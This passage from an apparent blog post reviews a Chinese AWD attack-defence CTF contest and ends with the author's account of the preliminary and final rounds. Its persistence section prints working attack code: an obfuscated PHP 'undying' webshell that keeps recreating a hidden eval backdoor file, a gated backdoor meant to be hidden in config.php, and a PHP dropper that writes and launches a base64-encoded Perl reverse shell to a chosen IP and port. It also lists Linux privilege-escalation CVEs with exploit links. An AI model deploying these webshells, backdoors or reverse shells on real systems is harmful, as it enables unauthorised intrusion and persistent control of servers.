+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    $file = <span class="string">'.demo.php'</span>;</span><br><span class="line">    $shell = <span class="string">"&lt;?php $_hR=chr(99).chr(104).chr(114);$_cC=$_hR(101).$_hR(118).$_hR(97).$_hR(108).$_hR(40).$_hR(36).$_hR(95).$_hR(80).$_hR(79).$_hR(83).$_hR(84).$_hR(91).$_hR(49).$_hR(93).$_hR(41).$_hR(59);$_fF=$_hR(99).$_hR(114).$_hR(101).$_hR(97).$_hR(116).$_hR(101).$_hR(95).$_hR(102).$_hR(117).$_hR(110).$_hR(99).$_hR(116).$_hR(105).$_hR(111).$_hR(110);$_=$_fF("</span><span class="string">",$_cC);@$_();?&gt;"</span>;</span><br><span class="line">    <span class="comment">//$_hR='chr'</span></span><br><span class="line">    <span class="comment">//$_cC='eval($_POST[1]);'</span></span><br><span class="line">    <span class="comment">//$_fF='create_function'</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line">        touch(<span class="string">".demo.php"</span>, mktime(<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">2018</span>));</span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>利用预留后门，上传上面的“不死马”并访问，就会一直生成.demo.php的一句话木马，木马内容可以自行修改，只要别被其他队伍看懂就行。</li>
+</ul>
+<blockquote>
+<p>文件名前加一个点，能更好地隐藏文件</p>
+</blockquote>
+<ul>
+<li>想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下:</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">$pid=<span class="number">1234</span>;</span><br><span class="line">@unlink(<span class="string">'.demo.php'</span>);</span><br><span class="line">exec(<span class="string">'kill -9 $pid'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>先查看进程，查看对应的pid，再执行即可。</p>
+</blockquote>
+<p><strong>md5马+header:</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</span><br><span class="line">	$test= <span class="string">'flag'</span>;</span><br><span class="line">    header(<span class="string">"flag:$test"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>放进config.php,或者index.php效果最好，因为一般很少人去看这个。</p>
+</blockquote>
+<p><strong>反弹shell：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">which</span><span class="params">($pr)</span></span>&#123; </span><br><span class="line">        $path = execute(<span class="string">"which $pr"</span>); </span><br><span class="line">        <span class="keyword">return</span> ($path ? $path : $pr); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">($cfe)</span></span>&#123; </span><br><span class="line">        $res = <span class="string">''</span>; </span><br><span class="line">        <span class="keyword">if</span> ($cfe)&#123; </span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'exec'</span>))&#123; </span><br><span class="line">                @exec($cfe,$res); </span><br><span class="line">                $res = join(<span class="string">"\n"</span>,$res); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(function_exists(<span class="string">'shell_exec'</span>))&#123; </span><br><span class="line">                $res = @shell_exec($cfe); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(function_exists(<span class="string">'system'</span>))&#123;</span><br><span class="line">                @ob_start();</span><br><span class="line">                @system($cfe);</span><br><span class="line">                $res = @ob_get_contents();</span><br><span class="line">                @ob_end_clean();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(function_exists(<span class="string">'passthru'</span>))&#123; </span><br><span class="line">            @ob_start(); </span><br><span class="line">            @passthru($cfe); </span><br><span class="line">            $res = @ob_get_contents(); </span><br><span class="line">            @ob_end_clean(); </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(@is_resource($f = @popen($cfe,<span class="string">"r"</span>)))&#123; </span><br><span class="line">                $res = <span class="string">''</span>;</span><br><span class="line">                <span class="keyword">while</span>(!@feof($f))&#123;</span><br><span class="line">                    $res .= @fread($f,<span class="number">1024</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                @pclose($f);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">cf</span><span class="params">($fname,$text)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123;</span><br><span class="line">            @fputs($fp,@base64_decode($text));</span><br><span class="line">            @fclose($fp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $yourip = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">    $yourport = <span class="string">'9999'</span>;</span><br><span class="line">    $usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>);</span><br><span class="line">  $back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    base64加密内容如下：</span></span><br><span class="line"><span class="comment">    #!/usr/bin/perl</span></span><br><span class="line"><span class="comment">    use Socket;</span></span><br><span class="line"><span class="comment">    $cmd= "lynx";</span></span><br><span class="line"><span class="comment">    $system= 'echo "`uname -a`";echo "`id`";/bin/sh';</span></span><br><span class="line"><span class="comment">    $0=$cmd;</span></span><br><span class="line"><span class="comment">    $target=$ARGV[0];</span></span><br><span class="line"><span class="comment">    $port=$ARGV[1];</span></span><br><span class="line"><span class="comment">    $iaddr=inet_aton($target) || die("Error: $!\n");</span></span><br><span class="line"><span class="comment">    $paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");</span></span><br><span class="line"><span class="comment">    $proto=getprotobyname('tcp');</span></span><br><span class="line"><span class="comment">    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");</span></span><br><span class="line"><span class="comment">    connect(SOCKET, $paddr) || die("Error: $!\n");</span></span><br><span class="line"><span class="comment">    open(STDIN, "&gt;&amp;SOCKET");</span></span><br><span class="line"><span class="comment">    open(STDOUT, "&gt;&amp;SOCKET");</span></span><br><span class="line"><span class="comment">    open(STDERR, "&gt;&amp;SOCKET");</span></span><br><span class="line"><span class="comment">    system($system);</span></span><br><span class="line"><span class="comment">    close(STDIN);</span></span><br><span class="line"><span class="comment">    close(STDOUT);</span></span><br><span class="line"><span class="comment">    close(STDERR);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    cf(<span class="string">'/tmp/.bc'</span>,$back_connect);</span><br><span class="line">    $res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><em>利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，之后就可以一直得分了</em></p>
+<blockquote>
+<p>权限维持后记: 以上权限维持篇是之前自己收藏大佬写的，比赛当中因为菜，没来得及做，也正是如此导致，前期我们的优势并没有利用好！所以这里建议，在做好攻击的同时下一步就是马上做权限维持！最好搞个一条龙的EXP，思路：上马-在上的马上执行权限维持脚本或命令</p>
+</blockquote>
+<h2 id="提权篇"><a href="#提权篇" class="headerlink" title="提权篇:"></a>提权篇:</h2><p><strong>在AWD中，一般都需要专门防御加固自己服务器的环节，但加固的很多操作都会涉及到root权限，如果直接给root权限最好，但一般只会给一个普通权限账号，这时候往往就需要给服务器提权了。关于提权，通常我们要根据kernel版本号找到对应的poc，平时我们可以收集测试一些比较新的提权poc，以备不时之需。</strong></p>
+<blockquote>
+<p>Linux_Local_Root_Exploits ：这网站收集了许多linux本地提权的poc。</p>
+</blockquote>
+<blockquote>
+<p>Linux-kernel-exploits(github) ：一个挺全的提权exp项目，收集了04年至今的exp，并按年份和CVE归类</p>
+</blockquote>
+<ul>
+<li><p>下面分享几个最近两年并且影响范围比较大的：</p>
+</li>
+<li><p>CVE-2017-6074 (DCCP双重释放漏洞 &gt; 2.6.18 ) ：DCCP双重释放漏洞可允许本地低权限用户修改Linux内核内存，导致拒绝服务（系统崩溃）或者提升权限，获得系统的管理访问权限</p>
+</li>
+<li><p>CVE-2016-5195(脏牛，kernel 2.6.22 &lt; 3.9 (x86/x64)) ：低权限用户可修改root用户创建的文件内容，如修改 /etc/passwd，把当前用户的 uid 改成 0 即可提升为root权限</p>
+</li>
+<li><p>CVE-2016-8655(Ubuntu 12.04、14.04，Debian 7、8) ：条件竞争漏洞，可以让低权限的进程获得内核代码执行权限</p>
+</li>
+<li><p>POC：<a href="https://www.seebug.org/vuldb/ssvid-92567" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92567</a></p>
+</li>
+<li><p>CVE-2017-1000367(sudo本地提权漏洞 ) ：Linux Kernel Stack Clash安全漏洞。该漏洞是由于操作系统内存管理中的一个堆栈冲突漏洞，它影响Linux，FreeBSD和OpenBSD，NetBSD，Solaris，i386和AMD64，攻击者可以利用它破坏内存并执行任意代码 。</p>
+</li>
+<li><p>CVE-2016-1247(Nginx权限提升漏洞) ：Nginx服务在创建log目录时使用了不安全的权限设置，可造成本地权限提升，恶意攻击者能够借此实现从 nginx/web 的用户权限 www-data 到 root 用户权限的提升。</p>
+</li>
+<li><p>POC：<a href="https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html" target="_blank" rel="noopener">https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html</a></p>
+</li>
+</ul>
+<blockquote>
+<p>收集了一些提权的脚本工具集，可作参考：<a href="https://github.com/edwardchoijc/ctf-toolkit/Linux/getROOT" target="_blank" rel="noopener">https://github.com/edwardchoijc/ctf-toolkit/Linux/getROOT</a></p>
+</blockquote>
+<h2 id="比赛复盘"><a href="#比赛复盘" class="headerlink" title="比赛复盘"></a>比赛复盘</h2><h3 id="南京初赛："><a href="#南京初赛：" class="headerlink" title="南京初赛："></a>南京初赛：</h3><ul>
+<li><p>客观因素，比如某某信主办方真的是不会办比赛，初赛时因为弱口令，美其名曰“考点”，但是确实对我们这种第一次上场的小白，相当不友好，初赛上场就被大佬队改了ssh服务密码，导致几乎全场ssh都上不去，比三个小时，足足停了1个小时，呢会儿初赛真的乱得一塌糊涂，当然主观方面还是得承认自己准备得不足，没有很充分，归根结底是自己菜</p>
+</li>
+<li><p>后来赛方重启了服务吧，把口令都改成强口令了，比赛才能继续进行，这个时候大佬队遥遥领先，根本追不上，加上呢会儿还不会针对挖到的漏洞写exp，上了马只能一个一个手动拖，还好呢会儿我们手速快，毕竟实力单身20多年，我们连上ssh把源码拖d盾一扫，然后用之前上一届师兄留下的“传家宝”脚本，很快通过预留webshell，打了一批不死马进去</p>
+</li>
+<li><p>然后一台一台机器，拿蚁剑连，连上了执行getflag的命令，我眼睛都快花了，还好比赛快结束了</p>
+</li>
+<li><p>运气还是非常不错的，我们第一次参赛没有被淘汰，狗进了决赛</p>
+</li>
+</ul>
+<h3 id="北京决赛："><a href="#北京决赛：" class="headerlink" title="北京决赛："></a>北京决赛：</h3><ul>
+<li><p>客观因素，还是一样的主办方，还是一样的不会办比赛，巧的是我这次准备了ssh批量改弱口令，并且搞定了针对挖到的漏洞，写批量exp。。嘿，你说气不气，上场还是一样的ssh连不上，这次还是被弱口令搞了嘛？<br>不是哦，这次是他们带我们入场时没有按照之前配的交换机，路由编号就坐，导致了除了1队2队以外，其余的队伍，ip都混乱了。。场面再一次陷入尴尬</p>
+</li>
+<li><p>等了差不多也是一个小时多点，终于能上ssh了，但是这个时候之前第一支队伍和运气好能连上的队伍，已经差不多把预留webshell，功能点都测试完了</p>
+</li>
+<li><p>还是凭借傲人的手速，对着上述攻击步骤，很快写出批量提交flag的脚本，然后我的队友戴哥把预留马利用脚本加上我的批量提交flag脚本，加上防守队员晓航坚不可摧的金钟罩，一路冲到第四名。。</p>
+</li>
+<li><p>但是天有不测风云，主办方这次搞了个check机制，好像是只要上waf的，就被判down，扣100分，我们队发现了这个情况，很快就把waf撤了，所以只扣了200，其他大佬队没有关注，只关注了pwn，听说后面pwn服务器也连不上了哈哈哈哈</p>
+</li>
+<li><p>后来pwn服务恢复了，大佬队究竟是大佬队，pwn我们都没去管，导致了最后pwn失分严重，而且比赛到中后期，该删的马，该补的洞都补完了，已经想不出有办法攻击了</p>
+</li>
+<li><p>我们最忽视的一个点就是权限维持，之前打进去的不死马，都没做权限维持，都被删掉了。我们自己队伍之间用来通信交流的马又出现了问题，不能用。简直无能狂怒阿</p>
+</li>
+<li><p>最后还是狗到了第12名，混了个全国二等奖，也有幸能和北邮天书这样的大佬队同台竞技，真的感觉相当好</p>
+</li>
+</ul>
+<h1 id="最后想说的话："><a href="#最后想说的话：" class="headerlink" title="最后想说的话："></a>最后想说的话：</h1><blockquote>
+<p>自己也是三脚猫的功夫，一年不到的时间学了点皮毛，但是建议和我一样的小白们不要去纠结，到底怎么学。系统的学？还是直接动手搞？我的建议是，理论基础走马观花看一遍，直接动手搞，并把自己学到的所记录的，授予他人，这样你才不容易遗忘，也是真正的极客精神！<br>Peace！~</p>
+</blockquote>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://r0ot-to0r.github.io">Johnny</a>
+            <p>原文链接：<a href="https://r0ot-to0r.github.io/2019/09/16/个人年度总结及AWD线下赛复盘/">https://r0ot-to0r.github.io/2019/09/16/个人年度总结及AWD线下赛复盘/</a>
+            <p>发表日期：<a href="https://r0ot-to0r.github.io/2019/09/16/个人年度总结及AWD线下赛复盘/">September 16th 2019, 7:51:42 pm</a>
+            <p>更新日期：<a href="https://r0ot-to0r.github.io/2019/09/16/个人年度总结及AWD线下赛复盘/">September 18th 2019, 7:24:16 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/r0ot-to0r.github.io/2019/09/16/pwnable-fd/" title= "pwnable-fd">
+                    <div class="prevTitle">pwnable-fd</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:645926235@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/r0ot-to0r" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/r0ot-to0r.github.io/assets/wechat-code.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#个人年度总结及AWD线下赛复盘"><span class="toc-number">1.</span> <span class="toc-text">个人年度总结及AWD线下赛复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#与网安的渊源"><span class="toc-number">1.1.</span> <span class="toc-text">与网安的渊源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#需要准备的"><span class="toc-number">1.2.</span> <span class="toc-text">需要准备的</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AWD线下赛介绍"><span class="toc-number">2.</span> <span class="toc-text">AWD线下赛介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#赛制和时长："><span class="toc-number">2.1.</span> <span class="toc-text">赛制和时长：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#竞赛规则"><span class="toc-number">2.2.</span> <span class="toc-text">竞赛规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻防对抗赛评分规则："><span class="toc-number">2.3.</span> <span class="toc-text">攻防对抗赛评分规则：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#团队分工"><span class="toc-number">2.4.</span> <span class="toc-text">团队分工</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御篇"><span class="toc-number">2.5.</span> <span class="toc-text">防御篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、AWD防守队员需具备的基础知识和防御关注方向："><span class="toc-number">2.5.1.</span> <span class="toc-text">一、AWD防守队员需具备的基础知识和防御关注方向：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、防守流程详解："><span class="toc-number">2.5.2.</span> <span class="toc-text">二、防守流程详解：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、关于被攻击后如何加固防护并加以利用："><span class="toc-number">2.5.3.</span> <span class="toc-text">三、关于被攻击后如何加固防护并加以利用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#防御后记："><span class="toc-number">2.5.4.</span> <span class="toc-text">防御后记：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击篇"><span class="toc-number">2.6.</span> <span class="toc-text">攻击篇</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限维持篇"><span class="toc-number">2.7.</span> <span class="toc-text">权限维持篇</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权篇"><span class="toc-number">2.8.</span> <span class="toc-text">提权篇:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#比赛复盘"><span class="toc-number">2.9.</span> <span class="toc-text">比赛复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#南京初赛："><span class="toc-number">2.9.1.</span> <span class="toc-text">南京初赛：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#北京决赛："><span class="toc-number">2.9.2.</span> <span class="toc-text">北京决赛：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#最后想说的话："><span class="toc-number">3.</span> <span class="toc-text">最后想说的话：</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 2
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/r0ot-to0r.github.io/2019/09/16/个人年度总结及AWD线下赛复盘/" >个人年度总结及AWD线下赛复盘</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/r0ot-to0r.github.io/2019/09/16/pwnable-fd/" >pwnable-fd</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/r0ot-to0r.github.io/",
+        author: "Johnny"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/r0ot-to0r.github.io/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/r0ot-to0r.github.io/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/r0ot-to0r.github.io/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
